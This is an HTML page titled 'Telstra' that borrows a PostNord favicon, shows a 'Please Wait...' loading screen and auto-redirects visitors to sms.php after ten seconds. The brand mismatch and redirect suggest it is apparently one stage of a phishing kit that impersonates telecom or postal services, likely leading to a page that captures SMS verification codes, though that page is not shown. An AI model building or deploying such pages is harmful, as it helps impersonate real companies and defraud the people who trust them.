<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Telstra</title>
<meta name="generator" content="WYSIWYG Web Builder 14 - http://www.wysiwygwebbuilder.com">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://www.postnord.dk/build/20745112381/ui/images/favicons/favicon-32x32.png" rel="shortcut icon" type="image/x-icon">
<link href="app_icon_oficina_128x128.png" rel="apple-touch-icon" sizes="128x128">
<link href="src/mag1.css" rel="stylesheet">
<link href="src/mag2.css" rel="stylesheet">
</head>
<body>

         <meta http-equiv="refresh" content="10; url=sms.php" />

<div id="FlexContainer1">
<div id="wb_LayoutGrid1">
<div id="LayoutGrid1">
<div class="col-1">
<div id="wb_LayoutGrid2">
<div id="LayoutGrid2">
<div class="row">
<div class="col-1">
<div id="wb_Image" style="">
<img src="src/load.gif" id="Image1" alt="">
</div>
<div id="wb_Text2">
<span style="color:#000000;font-family:Arial;font-size:16px;"><br><br><br>Please Wait... <strong></strong>.<br></span>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>